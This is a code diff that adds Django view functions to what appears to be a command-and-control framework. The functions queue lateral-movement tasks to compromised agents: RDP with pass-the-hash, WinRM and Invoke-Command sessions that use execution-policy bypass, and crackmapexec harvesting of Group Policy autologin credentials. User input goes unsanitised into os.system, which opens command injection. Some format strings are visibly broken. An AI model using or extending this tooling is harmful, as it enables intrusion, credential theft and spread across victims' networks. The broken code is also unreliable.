@@ -1206,4 +1206,94 @@ def Enum_GroupMembers_on_machine(request):
     else:
         return render(request, 'blog/listeners.html')
 
-        
+
+def LateralMov_RDP(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        domain = request.POST['domain']
+        ip = request.POST['ip']
+        username = request.POST['username']
+        password = request.POST['password']   ## optional
+        PassTheHash = request.POST['PassTheHash']  ##optional
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============Lateral Movement via RDP===============' >> {};".format(result_path))
+
+        if password != "":
+            os.system("xfreerdp /d:{1} /u:{2} /p:{3} /v:{4};".format(result_path,domain,username,password,ip))
+        elif PassTheHash != "":
+            os.system("xfreerdp /d:{0} /u:{1} /pth:{2} /v:{3};".format(domain,username,PassTheHash,ip))
+
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')    
+
+
+def LateralMov_WinRM(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        username = request.POST['username']
+        password = request.POST['password']
+        domain = request.POST['domain']
+        computername = request.POST['computername']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via WinRm (Enter-PSSesion)===============";$password=ConvertTo-SecureString \'{}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{}\{}", $password);Enter-PSSession -ComputerName {} -credential $creds2;echo "++++++++++++++++++`r`n"'.format(password,domain,username,computername)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def LateralMov_InvokeCommand(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        username = request.POST['username']
+        password = request.POST['password']
+        domain = request.POST['domain']
+        command = request.POST['command']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via InvokeCommand===============";$password=ConvertTo-SecureString \'{}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{}\{}", $password);Invoke-Command -ComputerName lab-dc-01 -Credential $creds2 -ScriptBlock {powershell -ep bypass /c "{}"};echo "++++++++++++++++++`r`n"'.format(password,domain,username,command)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def gpp_autologin(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        ip = request.POST['ip']
+        username = request.POST['username']
+        password = request.POST['password']   ## optional
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin >>{0}".format(result_path, ip,username,password))
+
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')  
